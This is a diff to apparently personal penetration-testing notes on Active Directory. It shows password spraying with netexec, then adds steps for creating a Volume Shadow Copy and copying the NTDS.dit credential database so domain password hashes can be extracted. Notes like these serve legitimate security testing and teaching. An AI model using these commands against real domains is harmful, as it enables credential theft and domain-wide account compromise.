@@ -9,3 +9,16 @@ After we prepared a list of possible usernames and password list, we can use dif
 ```
 netexec smb <dcip> -u <username> -p <passwordlist>
 ```
+
+After we are in and if we acquire an account with admin privilege, we can capture NTDS.dit and extract hashes for user accounts
+
+Using WinRM / PS:
+```
+net user <username> #check if user have respective privilege
+vssadmin CREATE SHADOW /FOR=C: #Important: Markdown Shadow Copy Volume Name
+cmd.exe /c copy <SCVolumeName>\Windows\NTDS\NTDS.dit <absdestpath>
+Example: cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+
+
+```
